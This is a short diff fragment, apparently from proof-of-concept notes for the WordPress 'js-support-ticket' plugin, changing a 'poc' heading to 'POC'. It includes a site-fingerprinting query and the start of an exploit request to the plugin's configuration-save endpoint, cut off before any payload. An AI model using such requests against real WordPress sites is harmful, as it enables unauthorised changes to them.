@@ -6,7 +6,7 @@
 body="wp-content/plugins/js-support-ticket"
 ```
 
-## poc
+## POC
 ```
 POST /wp-admin/?page=configuration&task=saveconfiguration HTTP/1.1
 Host: 
